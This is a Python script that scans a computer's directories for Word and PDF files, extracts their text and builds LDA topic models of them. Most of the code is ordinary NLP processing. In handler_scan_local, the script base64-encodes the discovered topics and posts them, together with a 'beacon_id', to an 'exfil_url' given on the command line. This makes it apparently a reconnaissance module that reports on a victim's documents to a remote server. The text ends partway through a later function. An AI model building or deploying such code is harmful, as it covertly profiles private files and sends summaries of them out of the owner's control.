# -*- coding: utf-8 -*-
"""
Created on Thu Dec 20 09:47:14 2018

@author: etienneg, wicusross
"""


# Run in terminal or command prompt
# python -m spacy download en
   
# Run in terminal or command prompt
# python3 -m spacy download en

import traceback
import os,sys,fnmatch,argparse,datetime
import glob
# from email import policy
# from email.parser import BytesParser
import win32com.client,docx
import PyPDF2

import numpy as np
import pandas as pd
import pickle
import ast
# from pprint import PrettyPrinter
# import matplotlib.pyplot as plt
# from sklearn.cluster import KMeans
# from collections import Counter

import warnings
warnings.filterwarnings("ignore", category=Warning)
warnings.filterwarnings("ignore", category=PendingDeprecationWarning) 
warnings.filterwarnings("ignore", category=DeprecationWarning) 
warnings.filterwarnings("ignore", category=FutureWarning)
warnings.filterwarnings("ignore", category=UserWarning)




import re, spacy, gensim
from nltk.corpus import stopwords
original_stop_words = stopwords.words('english')

# Sklearn
from sklearn.decomposition import LatentDirichletAllocation, TruncatedSVD, NMF
from sklearn.feature_extraction.text import CountVectorizer, TfidfVectorizer
# from sklearn.model_selection import GridSearchCV


# from gensim.parsing.preprocessing import STOPWORDS
# from nltk.stem import WordNetLemmatizer, SnowballStemmer
#from nltk.stem.porter import *
#import nltk
#import pyLDAvis.sklearn
import base64
import requests


class TopicModeltoPickle:
    def __init__(self,
                 email_vectoriser=None,
                 doc_vectoriser=None,
                 LDAEmailModel=None,
                 LDADocModel=None,
                 NMFEmailModel=None,
                 NMFDocModel=None,
                 removestopwords=True,
                 stopwords="",
                 processtext=True,
                 cleantext=True,
                 lemmapattern="['NOUN','ADJ','VERB','ADV']",
                 vectorizedtxt=None,
                 vectorizeddoctxt=None,
                 emailnumtopics=None,
                 doctext_number_topics=None,
                 doctext_forvectorize=None,
                 doctext_emailname=None
                 ):
        #Need everyting here to process future text to see which topic it belongs to so
        
        ##  clean text in same way
        ## vectorise the text using the vectoriser
        ## transform the text using the vectoriser
        self.removestopwords=removestopwords
        self.stopwords=stopwords
        self.email_vectoriser=email_vectoriser
        self.doc_vectoriser=doc_vectoriser
        self.cleantext=cleantext
        self.processtext=processtext
        self.lemmapattern=lemmapattern
        self.NMFEmailModel=NMFEmailModel
        self.NMFDocModel=NMFDocModel
        self.LDAEmailModel=LDAEmailModel
        self.LDADocModel=LDADocModel
        self.vectorizedtxt=vectorizedtxt
        self.vectorizeddoctxt=vectorizeddoctxt
        self.emailnumtopics=emailnumtopics
        self.doctext_number_topics=doctext_number_topics
        self.doctext_forvectorize=doctext_forvectorize
        self.doctext_emailname=doctext_emailname
        



class toPickle:
    def __init__(self,email_txt,email_txt_emailname,doc_txt,doc_txt_emailname):
        self.email_txt=email_txt
        self.email_txt_emailname=email_txt_emailname
        self.doc_txt=doc_txt
        self.doc_txt_emailname=doc_txt_emailname
    
        
        
        
        
        
class TopicModel:
    # stemmer = SnowballStemmer('english')
    word = win32com.client.Dispatch("Word.Application")
    word.visible = False
        
    def __init__(self,emaildir=None,tempdir=None,readdrivedir=None):

        # Initialize spacy 'en' model, keeping only tagger component (for efficiency)
        self.nlp = spacy.load('en', disable=['parser', 'ner'])

        
        self.emaildirectory=emaildir
        self.readdrivedirectory=readdrivedir
        self.tempdir=tempdir
        self.topic_pickle = TopicModeltoPickle()

       
        
        #now do all the initialisation
        self.emailtext=[]
        self.emailtext_original=[]
        self.emailtext_words=[]
        self.emailtext_forvectorize=[]
        self.emailtext_emailname=[]
        self.emailtext_topic=[]
        
        self.emailtexttopwords=[]
        self.emailtexttopwordweights=[]
        
        self.emaildoctopwords=[]
        self.emaildoctopwordweights=[]
        
        self.doctext=[]
        self.doctext_original=[]
        self.doctext_forvectorize=[]
        self.doctext_words=[]
        self.doctext_emailname=[]
        self.doctext_topic=[]
        self.removewords=False
        self.removelist="is,are,was,were,has,have,must,may,should,shall,can,could,that,which,will,what,been,how,who,they,their"
        self.cleantext=False
        self.processtext=False
        self.lemma_args=[]
        self.ngram_args="1,1"
        self.bigram_args=[]
        self.regex_pattern=[]
        
        self.doattachments=True
        self.attachmentdirectory=[]
        self.dopdf=True
        
        self.text_nmf=[]
        self.doctext_nmf=[]
        self.tfidfTextFeatureNames=[]
        self.tfidfDocTextFeatureNames=[]
        self.text_lda=[]
        self.text_number_topics=None
        
        self.doctext_lda=[]
        self.doctext_number_topics=None
        
        
        self.countTextFeatureNames=[]
        self.countDocTextFeatureNames=[]
              
        self.currentEmailVectorizer=None
        self.currentDocVectorizer=None   
        self.currentEmailVectorised=None
        self.currentDocVectorised=None
        self.stoplistextended=False
        self.stop_words=original_stop_words
        
        self.Algorithm="LDA"
        self.VectorizerMethod="Count Vectorizer"
        self.LDALearningMethod="batch"
        
        self.df_email_TextTopics=pd.DataFrame()
        self.df_email_DocTopics=pd.DataFrame()
        self.df_email_doc_topic_distribution = pd.DataFrame()
        self.df_email_text_topic_distribution = pd.DataFrame()      
                
        
 
        
    def populateWordWeightMatrix(self,no_top_words=10):
        model=self.text_lda
        if not(model==None):
            weights=model.components_/model.components_.sum(axis=1)[:,None]
            for idx,topic in enumerate(weights):
                self.emailtexttopwords.append([self.currentEmailVectorizer.get_feature_names()[i] for i in topic.argsort()[:-no_top_words -1:-1]])
                self.emailtexttopwordweights.append([topic[i] for i in topic.argsort()[:-no_top_words -1:-1]])
        model=self.doctext_lda
        if not(model==None):
            weights=model.components_/model.components_.sum(axis=1)[:,None]
            for idx,topic in enumerate(weights):
                self.emaildoctopwords.append([self.currentDocVectorizer.get_feature_names()[i] for i in topic.argsort()[:-no_top_words -1:-1]])
                self.emaildoctopwordweights.append([topic[i] for i in topic.argsort()[:-no_top_words -1:-1]])
                
            
            
            
    def displayTopics(self, model, vectorizer, no_top_words=10,printvalues=False):
        for idx,topic in enumerate(model.components_):
            print("Topic %d:" % (idx))
            if printvalues:
                print([(vectorizer.get_feature_names()[i],topic[i]) for i in topic.argsort()[:-no_top_words -1:-1]])
            else:    
                print(" ".join([vectorizer.get_feature_names()[i] for i in topic.argsort()[:-no_top_words -1:-1]]))
    
    def stringTopics(self, model, vectorizer, no_top_words=10):
        toreturn=""
        for idx,topic in enumerate(model.components_):
            toreturn=toreturn+"Topic %d:" % (idx)
            toreturn=toreturn +" ".join([vectorizer.get_feature_names()[i] for i in topic.argsort()[:-no_top_words -1:-1]])
            toreturn=toreturn +"\n"
        return toreturn
    
    def listTopics(self,model,vectorizer,no_top_words=10):
        toreturn=[]
        for idx,topic in enumerate(model.components_):
            string="Topic %d:" % (idx)
            string=string +" ".join([vectorizer.get_feature_names()[i] for i in topic.argsort()[:-no_top_words -1:-1]])
            toreturn.append(string)
        return toreturn
    
    def displayEmailsMatchingTextTopic(self,topicnumber):
        result=[]
        for idx,topic in enumerate(self.emailtext_topic):
            if topic==topicnumber:
                result.append(self.emailtext_emailname[idx])
        return result

    def displayEmailsMatchingDocTopic(self,topicnumber):
        result=[]
        #print(self.doctext_topic)
        for idx,topic in enumerate(self.doctext_topic):
            #print(idx)
            #print(topic)
            if topic==topicnumber:
                result.append(self.doctext_emailname[idx])
        return result

            
    def _save_file(self,fn, cont):
        """Saves cont to a file fn"""
        #print("Trying to create file:",fn)
        filename=os.path.join(self.attachmentdirectory,fn)  
        if(os.path.exists(filename)):
            #if the file exists delete it as we must have run this before
            os.remove(filename)         
        try:
           
            # handle error here
            file = open(filename, "wb")
            file.write(cont)
            file.close()
        except OSError:
            print("Could not create file: ",filename)
            #create filename with current date and time
            
        return (filename)
    
    def _read_text_msword(self,filename):
        if(os.path.exists(filename)):
            try:
                wb = self.word.Documents.Open(filename)
                doc = self.word.ActiveDocument
                Text=doc.Range().Text
                wb = self.word.Documents.Close()
                return Text
            except:
                return ""
        else:
            return ""
        
    def _read_text_pdf(self,filename):
        Text=""
        if(os.path.exists(filename)):
            try:
                pdfFileObj = open(filename, 'rb') 
  
                # creating a pdf reader object 
                pdfReader = PyPDF2.PdfFileReader(pdfFileObj) 
  
                for page in pdfReader.pages:
                    Text=Text+page.extractText() 
                pdfFileObj.close() 
                return Text
            except:
                return ""
        else:
            return ""
        
          
    # def _preprocess(self,text,english_regex=False,RemoveList=None):
    #     resulttext=[]
    #     if RemoveList==None:
    #         RemoveList=""
        
        
    #     for token in gensim.utils.simple_preprocess(text):
    #         if english_regex:
    #             if token not in STOPWORDS and token not in RemoveList and len(token) > 3 and re.match('[a-zA-Z\-][a-zA-Z\-]{2,}', token):
    #                 resulttext.append(self.stemmer.stem(WordNetLemmatizer().lemmatize(token,pos='v')))
    #         else:
    #             if token not in STOPWORDS and token not in RemoveList and len(token) > 3:
    #                 resulttext.append(self.stemmer.stem(WordNetLemmatizer().lemmatize(token,pos='v')))

    #     return resulttext
    
    def sentencesToWords(self,sentences):
        
        for sentence in sentences:
            yield(gensim.utils.simple_preprocess(str(sentence), deacc=True))  # deacc=True removes punctuations
    
    
    
    def remove_stopwords(self,texts):
        return [[word for word in gensim.utils.simple_preprocess(str(doc)) if word not in self.stop_words] for doc in texts]

    def lemmatizeText(self,texts,allowed_postags=['NOUN', 'ADJ', 'VERB', 'ADV']):

        """https://spacy.io/api/annotation"""
        texts_out = []
        self.nlp.max_length=2000000
        for sent in texts:
            doc = self.nlp(" ".join(sent)) 
            texts_out.append(" ".join([token.lemma_ if token.lemma_ not in ['-PRON-'] else '' for token in doc if token.pos_ in allowed_postags]))
        return texts_out

    
    def cleanandProcessText(self):
        
        self.stop_words=original_stop_words
        self.stop_words.extend(re.sub("\'","",self.removelist).split(','))
        
        self.doctext_words[:]=[]
        self.emailtext_words[:]=[]
        
        if self.emailtext_original:
            self.emailtext=self.emailtext_original
            if self.cleantext: # was the clean text box ticked/comannd line arg chosen ?
                self.emailtext = [re.sub('\S*@\S*\s?', '', sent) for sent in self.emailtext] 
                # Remove new line characters
                self.emailtext = [re.sub('\s+', ' ', sent) for sent in self.emailtext]
    
                # Remove distracting single quotes
                self.emailtext = [re.sub("\'", "", sent) for sent in self.emailtext]

            
            self.emailtext_words=list(self.sentencesToWords(self.emailtext))               
            if self.removewords:
                self.emailtext_words=self.remove_stopwords(self.emailtext_words)
                
            #now lemmatize this lot
            if self.processtext:  ## Was lemmatize selelcted or was command line switch invoked ?
                self.emailtext_forvectorize=self.lemmatizeText(self.emailtext_words,allowed_postags=self.lemma_args)
            else:
                self.emailtext_forvectorize=[" ".join(txt) for txt in self.emailtext_words]
                
                
            
        if self.doctext_original:
            self.doctext=self.doctext_original
            if self.cleantext:
                self.doctext = [re.sub('\S*@\S*\s?', '', sent) for sent in self.doctext] 
                # Remove new line characters
                self.doctext = [re.sub('\s+', ' ', sent) for sent in self.doctext]
    
                # Remove distracting single quotes
                self.doctext = [re.sub("\'", "", sent) for sent in self.doctext]

            self.doctext_words=list(self.sentencesToWords(self.doctext))
            if self.removewords:               
                self.doctext_words=self.remove_stopwords(self.doctext_words)
                
            #now lemmatize this lot
            if self.processtext:
                self.doctext_forvectorize=self.lemmatizeText(self.doctext_words,allowed_postags=self.lemma_args)
            else:
                self.doctext_forvectorize=[" ".join(txt) for txt in self.doctext_words]
                
    def initialiseTextFields(self):    
        self.emailtext_original[:]=[]
        self.emailtext[:]=[]
        self.emailtext_words[:]=[]
        self.emailtext_emailname[:]=[]
        
        self.doctext[:]=[]
        self.doctext_words[:]=[]
        self.doctext_original[:]=[]
        self.doctext_emailname[:]=[]
        
        self.doctext_forvectorize[:]=[]
        self.emailtext_forvectorize[:]=[]        
        
        
    def resetVectorisersLDA(self):

        self.text_nmf=None
        

        self.doctext_nmf=None
        
        self.tfidfTextFeatureNames=[]
        self.tfidfDocTextFeatureNames=[]
        
        self.text_lda=None

        self.doctext_lda=None
       
        
        self.countTextFeatureNames=[]
        self.countDocTextFeatureNames=[]
        
        self.currentEmailVectorizer=None
        

        self.currentDocVectorizer=None  
        
        self.currentEmailVectorised=None
        
        self.currentDocVectorised=None    
        
        self.doctext_forvectorize[:]=[]
        self.emailtext_forvectorize[:]=[]

        self.df_email_TextTopics=pd.DataFrame()
        self.df_email_DocTopics=pd.DataFrame()
        self.df_email_doc_topic_distribution = pd.DataFrame()
        self.df_email_text_topic_distribution = pd.DataFrame() 
        
    def is_document_file(self,filename, extensions=['.doc', '.docx', '.rtf', '.pdf']):
        return any(filename.endswith(e) for e in extensions)   

    def readLocalComputerDocuments(self,doPDF=True,doWord=True):
        #Progressbar is for whenb we run in a go ...
 
        
        if self.readdrivedirectory==None:
            
            return False

        for dir_to_walk in self.readdrivedirectory:
            if not os.path.exists(dir_to_walk):
                #can't construct the class this is an error
                print('Computer directory {} does not exist'.format(dir_to_walk))
                
    #            raise Exception('.eml directory {} does not exist'.format(self.emaildirectory))
                return False
      
        ## Need to make sure the email text and doc text variables are empty
        self.initialiseTextFields()
        documents=[]
        if doWord==True:
            documents.append('*.docx')
        if doPDF==True:
            documents.append('*.pdf')
        
        for dir_to_walk in self.readdrivedirectory:
            for subdir, dirs, files in os.walk(dir_to_walk):
                for extension in documents:             
                    for file in fnmatch.filter(files,extension):       
                        filepath = subdir + os.sep + file
                        
                        #print os.path.join(subdir, file)
                            
                        filepath = subdir + os.sep + file
                        #print("current file : ",filepath)
                            
                        ##Now check if 
                        if filepath.endswith(".docx"):
                            DocText=[] 
                        

                            try:
                                doc = docx.Document(filepath)
                                for para in doc.paragraphs:
                                    DocText.append(para.text)
                                ReadText='\n'.join(DocText)
                            except:
                                ReadText=""

                        
                            if(len(ReadText.strip())):
                                self.doctext_original.append(ReadText.strip())
                                self.doctext_emailname.append(filepath)                            
                        if (filepath.endswith(".pdf") and  self.dopdf==True):  
                                            
                            ReadText=self._read_text_pdf(filepath)                    
                            if(len(filepath.strip())):
                                self.doctext_original.append(ReadText.strip())
                                self.doctext_emailname.append(file)
                                        
                           
        return True


    def readComputerDocuments(self,progressbar):
        #Progressbar is for whenb we run in a go ...
 
        
        if self.readdrivedirectory==None:
            #can't construct the class this is an error
            return False

        for dir_to_walk in self.readdrivedirectory:
            if not os.path.exists(self.readdrivedirectory):
                #can't construct the class this is an error
    #            raise Exception('.eml directory {} does not exist'.format(self.emaildirectory))
                return False
      
        ## Need to make sure the email text and doc text variables are empty
        self.initialiseTextFields()
        documents=['*.doc', '*.docx', '*.rtf', '*.pdf']    
        numfiles = 0
        for dir_to_walk in self.readdrivedirectory:
            for root, dirs, files in os.walk(self.readdrivedirectory):
                for file in files:   
                    
                    if file.endswith('.doc') or file.endswith('.docx') or file.endswith('.rtf') or file.endswith('.pdf'):
                        numfiles += 1
        if numfiles==0:
            numfiles=0.0001
        increment=100.0/numfiles
        completed=0
        for subdir, dirs, files in os.walk(self.readdrivedirectory):
            for extension in documents:             
                for file in fnmatch.filter(files,extension):       
                    completed += increment
                    filepath = subdir + os.sep + file
                    
                    #print os.path.join(subdir, file)
                        
                    filepath = subdir + os.sep + file
                    #print("current file : ",filepath)
                        
                    ##Now check if 
                    if filepath.endswith(".doc") or filepath.endswith(".docx") or filepath.endswith("*.rtf"):
                        ReadText=self._read_text_msword(filepath) 
        
                        if(len(ReadText.strip())):
                            self.doctext_original.append(ReadText.strip())
                            self.doctext_emailname.append(filepath)                            
                    if (filepath.endswith(".pdf") and  self.dopdf==True):  
                        ReadText=self._read_text_pdf(filepath)                    
                        if(len(filepath.strip())):
                            self.doctext_original.append(ReadText.strip())
                            self.doctext_emailname.append(file)
                                        
                           
        return True

    def tfidfVectorise(self,max_df=0.9,min_df=5.0,no_txt_features=10000,no_doc_features=10000,regex_pattern="",ngramrange="1,1"):
        self.tfidfVectText=None
        self.tfidfVectTextInitialized=False
        self.tfidfVectorizerText=None
        self.tfidfTextFeatureNames=None
        self.currentEmailVectorizer=None
        self.currentEmailVectorised=None
        
        self.tfidfVectDocText=None
        self.tfidfVectDocTextInitialized=False
        self.tfidfVectorizerDocText=None
        self.tfidfVectDocText=None
        self.tfidfDocTextFeatureNames=None
        self.currentEmailVectorizer=None
        self.currentDocVectorizer=None
        
        if(len(self.emailtext_forvectorize)):
            #now we have already stripped out english stop words earlier so here we can strip out optional other stop words if stoplist was passed
            self.tfidfVectorizerText = TfidfVectorizer(analyzer='word',token_pattern=regex_pattern,max_df=max_df, min_df=min_df, max_features=no_txt_features, stop_words=None,ngram_range=tuple(map(int,ngramrange.split(','))))
            
            #might not have enough e-mails to satisfy degrees of freedom so do some error handling here:
            try:
                self.tfidfVectText = self.tfidfVectorizerText.fit_transform(self.emailtext_forvectorize)
                self.tfidfTextFeatureNames = self.tfidfVectorizerText.get_feature_names()
                self.tfidfVectTextInitialized=True
                self.currentEmailVectorizer=self.tfidfVectorizerText
                self.currentEmailVectorised=self.tfidfVectText
   
            except:
                self.tfidfVectText=None
                self.tfidfVectTextInitialized=False
                self.tfidfVectorizerText=None
                self.tfidfVectDocText=None
                self.tfidfTextFeatureNames=None
                self.currentEmailVectorizer=None
        
                
                
            
        if(len(self.doctext_forvectorize)):
            #now we have already stripped out english stop words earlier so here we can strip out optional other stop words if stoplist was passed
            self.tfidfVectorizerDocText = TfidfVectorizer(token_pattern=regex_pattern,max_df=max_df, min_df=min_df, max_features=no_doc_features, stop_words=None,ngram_range=tuple(map(int,ngramrange.split(','))))
            
            #might not have enough attachments to satisfy the min degrees of freedom here so do a try with fit
            try:
                self.tfidfVectDocText = self.tfidfVectorizerDocText.fit_transform(self.doctext_forvectorize)
                self.tfidfDocTextFeatureNames = self.tfidfVectorizerDocText.get_feature_names()   
                self.tfidfVectDocTextInitialized=True
                self.currentDocVectorizer=self.tfidfVectorizerDocText
                self.currentDocVectorised=self.tfidfVectDocText
            except:
                ## reset things to what they were before we tried to vectorize
                self.tfidfVectDocText=None
                self.tfidfVectDocTextInitialized=False
                self.tfidfVectorizerDocText=None
                self.tfidfVectDocText=None
                self.tfidfDocTextFeatureNames=None
                self.currentDocVectorizer=None
                
                
        return self.tfidfVectText,self.tfidfVectDocText
                
                    
    def countVectorise(self,max_df=0.95,min_df=2,RemoveList=None,no_txt_features=1000,no_doc_features=1000,regex_pattern="",ngramrange="1,1"):
        self.countVectText=None
        self.countVectTextInitialized=False
        self.countVectorizerText=None
        self.countVectText=None
        self.countfTextFeatureNames=None
        
        self.countVectDocText=None
        self.countVectDocTextInitialized=False
        self.countVectorizerDocText=None
        self.countVectDocText=None
        self.countDocTextFeatureNames=None

        self.currentDocVectorizer=None 
        self.currentEmailVectorizer=None
        self.currentDocVectorised=None
        self.currentEmailVectorised=None
        
        if(len(self.emailtext_forvectorize)):
            #now we have already stripped out english stop words earlier so here we can strip out optional other stop words if stoplist was passed
            self.countVectorizerText = CountVectorizer(max_df, min_df, max_features=no_txt_features, stop_words=None,token_pattern=regex_pattern,decode_error='ignore',ngram_range=tuple(map(int,ngramrange.split(','))))
            self.countVectText = self.countVectorizerText.fit_transform(self.emailtext_forvectorize)
            self.countTextFeatureNames = self.countVectorizerText.get_feature_names()
            self.countVectTextInitialized=True
            self.currentEmailVectorizer=self.countVectorizerText 
            self.currentEmailVectorised=self.countVectText
            
        if(len(self.doctext_forvectorize)):
            #now we have already stripped out english stop words earlier so here we can strip out optional other stop words if stoplist was passed
            self.countVectorizerDocText = CountVectorizer(max_df, min_df, max_features=no_doc_features, stop_words=None,token_pattern=regex_pattern,decode_error='ignore',ngram_range=tuple(map(int,ngramrange.split(','))))
            # print(dir(self.doctext_forvectorize))
            # print(self.doctext_forvectorize)
            # print("----------------------------------")
            self.countVectDocText = self.countVectorizerDocText.fit_transform(self.doctext_forvectorize)
            self.countDocTextFeatureNames = self.countVectorizerDocText.get_feature_names()   
            self.countVectDocTextInitialized=True
            self.currentDocVectorizer=self.countVectorizerDocText 
            self.currentDocVectorised=self.countVectDocText
        return self.countVectText,self.countVectDocText
                    
   
    def populateTopicDataframe(self):
        # Styling
       
        if not(self.currentEmailVectorised==None or self.text_lda==None):
            lda_output_text = self.text_lda.transform(self.currentEmailVectorised)
            topicnames = ["Topic" + str(i) for i in range(len(self.text_lda.components_))]
            self.df_email_TextTopics = pd.DataFrame(np.round(lda_output_text, 2), columns=topicnames, index=self.emailtext_emailname)
            dominant_topic = np.argmax(self.df_email_TextTopics.values, axis=1)
            self.df_email_TextTopics['dominant_topic'] = dominant_topic
            
            self.df_email_text_topic_distribution = self.df_email_TextTopics['dominant_topic'].value_counts().reset_index(name="Num Documents")
            
            self.df_email_text_topic_distribution.columns = ['Topic_Num', 'Num_Documents']
            
        if not(self.currentDocVectorised==None or self.doctext_lda==None):
            lda_output_doc = self.doctext_lda.transform(self.currentDocVectorised)
            topicnames = ["Topic" + str(i) for i in range(len(self.doctext_lda.components_))]
            t=np.round(lda_output_doc, 2)
            # print(t)
            # print(self.doctext_emailname)
            # print(topicnames)
            self.df_email_DocTopics = pd.DataFrame(t, columns=topicnames, index=self.doctext_emailname)
            dominant_topic = np.argmax(self.df_email_DocTopics.values, axis=1)
            self.df_email_DocTopics['dominant_topic'] = dominant_topic
                        


            self.df_email_doc_topic_distribution = self.df_email_DocTopics['dominant_topic'].value_counts().reset_index(name="Num Documents")
            
            self.df_email_doc_topic_distribution.columns = ['Topic_Num', 'Num_Documents']

# Get dominant topic for each document







        
    def doNMF(self,text_vectorized=None,doc_text_vectorized=None,text_n_components=10, text_alpha=0.1, text_l1_ratio=.5, 
                     doc_n_components=10,doc_alpha=0.1,doc_l1_ratio=0.5,
                     random_state=1,init='nndsvd'):
            

        self.text_nmf=None
        self.doctext_nmf=None
        
        if not(text_vectorized==None):
            self.text_nmf = NMF(n_components=text_n_components, random_state=random_state,alpha=text_alpha, l1_ratio=text_l1_ratio, init=init).fit(text_vectorized)
            transformed=self.text_nmf.transform(text_vectorized)
            self.emailtext_topic=np.argmax(transformed,axis=1)
        if not(doc_text_vectorized==None):
            self.doctext_nmf = NMF(n_components=doc_n_components, random_state=random_state,alpha=doc_alpha, l1_ratio=doc_l1_ratio, init=init).fit(doc_text_vectorized)
            transformed=self.doctext_nmf.transform(doc_text_vectorized)
            self.doctext_topic=np.argmax(transformed,axis=1)
        return self.text_nmf,self.doctext_nmf
        
    def doLDA(self,text_vectorized=None,doc_text_vectorized=None,text_n_components=10, doc_n_components=10, max_iter=10, 
              learning_method='batch',learning_decay=0.7,batch_size=128,perp_tol=0.1,mean_change_tol=0.001,evaluate_every=0):

        self.text_lda=None
        

        self.doctext_lda=None
        
        if not(text_vectorized==None):
            #depending on learning method call with slightly different parameters
            if self.LDALearningMethod=="online":
                self.text_lda = LatentDirichletAllocation(n_components=text_n_components,max_iter=10, 
                                                          learning_method='online',learning_decay=learning_decay,
                                                          evaluate_every=evaluate_every,batch_size=batch_size,perp_tol=perp_tol,
                                                          mean_change_tol=mean_change_tol,random_state=100).fit(text_vectorized)
            elif self.LDALearningMethod=="batch":
                self.text_lda = LatentDirichletAllocation(n_components=text_n_components,max_iter=10, 
                                                          learning_method='batch',
                                                          evaluate_every=evaluate_every,perp_tol=perp_tol,
                                                          mean_change_tol=mean_change_tol,random_state=100).fit(text_vectorized)
                
            #use transform here to get all the topics for each for the emails
            transformed=self.text_lda.transform(text_vectorized)
            self.emailtext_topic=np.argmax(transformed,axis=1)
            
            
        if not(doc_text_vectorized==None):
            if self.LDALearningMethod=="online":
                self.doctext_lda = LatentDirichletAllocation(n_components=doc_n_components,max_iter=10, learning_method='online',
                                                             learning_decay=learning_decay,
                                                             evaluate_every=evaluate_every,batch_size=batch_size,perp_tol=perp_tol,
                                                             mean_change_tol=mean_change_tol,random_state=100).fit(doc_text_vectorized)
            elif self.LDALearningMethod=="batch":
                self.doctext_lda = LatentDirichletAllocation(n_components=text_n_components,max_iter=10, 
                                                          learning_method='batch',
                                                          evaluate_every=evaluate_every,perp_tol=perp_tol,
                                                          mean_change_tol=mean_change_tol,random_state=100).fit(doc_text_vectorized)
            
            transformed=self.doctext_lda.transform(doc_text_vectorized)
            self.doctext_topic=np.argmax(transformed,axis=1)
        
        self.populateTopicDataframe()
        
        return self.text_lda,self.doctext_lda    
    
    # def GridSearchLDA(self,gridsearch_args={'n_components': [10, 15, 20, 25, 30], 'learning_decay': [.5, .7, .9]}):
    #     self.text_lda=None
    #     self.doctext_lda=None
    #     model_text=None
    #     model_doctext=None
    #     besttextparams=""
    #     bestdoctextparams=""
    #     grid_args=ast.literal_eval(gridsearch_args)
    #     if not(self.currentEmailVectorised==None):
            
    #         self.text_lda = LatentDirichletAllocation()
    #         model_text = GridSearchCV(self.text_lda,param_grid=grid_args)
    #         model_text.fit(self.currentEmailVectorised)
    #         self.text_lda=model_text.best_estimator_
    #         besttextparams=PrettyPrinter().pformat(model_text.best_params_)
    #     if not(self.currentDocVectorised==None):
    #         self.doctext_lda = LatentDirichletAllocation()
    #         model_doctext = GridSearchCV(self.doctext_lda,param_grid=grid_args)
    #         model_doctext.fit(self.currentDocVectorised)
    #         self.doctext_lda=model_doctext.best_estimator_
    #         bestdoctextparams=PrettyPrinter().pformat(model_doctext.best_params_)
    #     return self.text_lda,besttextparams,self.doctext_lda,bestdoctextparams
            

def dump_topic_model(file_name, topic_model_pickle):
    afile = open(file_name, 'wb')
    pickle.dump(topic_model_pickle, afile)
    afile.close()


def handler_scan_local(args):
    Topic=TopicModel(tempdir=".\\")
    ##need to decode here either docs or pdfs or both
    if args.dir_to_scan:
        Topic.readdrivedirectory=args.dir_to_scan
    else:
        print("need argument -d <directory to scan>")
        return False
    
    if args.scan_what:
        scanwhat=args.scan_what
        if scanwhat=='W':
            doWord=True
            doPDF=False
            Topic.doattachments=True
        elif scanwhat=='P':
            doPDF=True
            doWord=False
            Topic.doattachments=True
            Topic.dopdf=True
        elif scanwhat=='B':
            doPDF=True
            doWord=True
            Topic.doattachments=True
            Topic.dopdf=True
    else:
        doWord=True
        doPDF=False
        Topic.doattachments=True      
        
    Topic.readLocalComputerDocuments(doPDF,doWord)
    Topic.removewords = args.scan_stop_words
    Topic.cleantext=True
    Topic.processtext=True
    
    if args.scan_lemmaargs:
        Topic.lemma_args=args.scan_lemmaargs
        Topic.processtext=True
    else:
        Topic.lemma_args="['NOUN','ADJ','VERB','ADV']"
        Topic.processtext=True
    
    if args.scan_ngram_args:
        Topic.ngram_args=args.scan_ngram_args
    else:
        Topic.ngram_args="1,1"
        
    if args.scan_regex_pattern:
        Topic.regex_pattern=args.scan_regex_pattern
    else: 
        Topic.regex_pattern="[a-zA-Z0-9]{3,}"
        
    
    Topic.text_number_topics=10
    
    if args.scan_number_topics:
        Topic.doctext_number_topics=args.scan_number_topics
    else:
        Topic.doctext_number_topics=10 


    ### Do a lot of heavy lifting to clean the text
    Topic.cleanandProcessText()
    #print ("Have cleaned text")
      
    emailnumtopics=10
    wordsdoctopic=10
        
    mindf=2
    maxdf=20
    numdocfeatures=10000
    numemailfeatures=10000
        

        #pyldavisdoc=not(self.ui.dovisdoc.checkState()==0)
    # if args.scan_dovis:
    #     pyldavisdocfile="c:\\temp\\"+datetime.datetime.now().strftime("%B %d %Y %Hh%M")+" pyldavisdoc.html"  
    #     pyldavisdoc=True
    # else:
    #     pyldavisdoc=False
    topic_model_piclk=".\\current.pkl"  
        
    vectorizedtxt,vectorizeddoctxt=Topic.countVectorise(min_df=mindf,max_df=maxdf,no_txt_features=numemailfeatures,no_doc_features=numdocfeatures,
                                                        regex_pattern=Topic.regex_pattern,ngramrange=Topic.ngram_args) 
 

    Topic.topic_pickle.vectorizedtxt=vectorizedtxt
    Topic.topic_pickle.vectorizeddoctxt=vectorizeddoctxt
    Topic.topic_pickle.emailnumtopics=emailnumtopics
    Topic.topic_pickle.doctext_number_topics=Topic.doctext_number_topics
    Topic.topic_pickle.doc_vectoriser=Topic.currentDocVectorizer
    Topic.topic_pickle.doctext_forvectorize=Topic.doctext_forvectorize
    Topic.topic_pickle.doctext_emailname=Topic.doctext_emailname
    dump_topic_model(topic_model_piclk, Topic.topic_pickle)

    todisplaydoc=""

        
    Topic.emaildoctopwords[:]=[]
    Topic.emaildoctopwordweights[:]=[]


    learning_decay=0.7 #online used in online
    batch_size=128 #only used in online
    perp_tol=0.1 #only used in batch learning
    
    if args.scan_max_iter:
        iterations=args.scan_maxiter
    else:
        iterations=20
        
    evaluate_every=1
    mean_change_tol=0.001
              
    LDA, LDADoc=Topic.doLDA(text_vectorized=vectorizedtxt,doc_text_vectorized=vectorizeddoctxt,
                        text_n_components=emailnumtopics,doc_n_components=Topic.doctext_number_topics,
                        learning_method="batch",max_iter=iterations,learning_decay=learning_decay,
                        batch_size=batch_size,perp_tol=perp_tol,mean_change_tol=mean_change_tol,evaluate_every=evaluate_every)   
              


    if not(LDADoc==None):                  
        todisplaydoc=Topic.stringTopics(LDADoc,Topic.currentDocVectorizer,no_top_words=wordsdoctopic)
        print(todisplaydoc)
        b64_str = base64.b64encode(bytes(todisplaydoc, 'UTF-8'))
        data='beacon_id={beacon_id}&topic_model={b64_str}'.format(beacon_id=args.beacon_id,b64_str=b64_str.decode())
        requests.post(args.exfil_url, data=data)

def load_pickle(file_name):
    result = None
    with open(file_name, 'rb') as afile:
        result = pickle.load(afile)
    return result


def handle_load_pickle(args):
    # file_name = args.pickle_load_file_name
    topic_model_picle = load_pickle(".\\current.pkl")
    todisplaydoc=""

    Topic=TopicModel(tempdir=".\\")        
    Topic.initialiseTextFields()
    Topic.doctext_forvectorize = topic_model_picle.doctext_forvectorize
    Topic.emaildoctopwords[:]=[]
    Topic.emaildoctopwordweights[:]=[]
    Topic.doctext_emailname=topic_model_picle.doctext_emailname
    if args.scan_regex_pattern:
        Topic.regex_pattern=args.scan_regex_pattern
    else: 
        Topic.regex_pattern="[a-zA-Z0-9]{3,}"

    if not args.topic_nrs:
        print('Topic numbers expected')
        return

    emailnumtopics=10
    wordsdoctopic=10
        
    mindf=2
    maxdf=20
    numdocfeatures=10000
    numemailfeatures=10000

    learning_decay=0.7 #online used in online
    batch_size=128 #only used in online
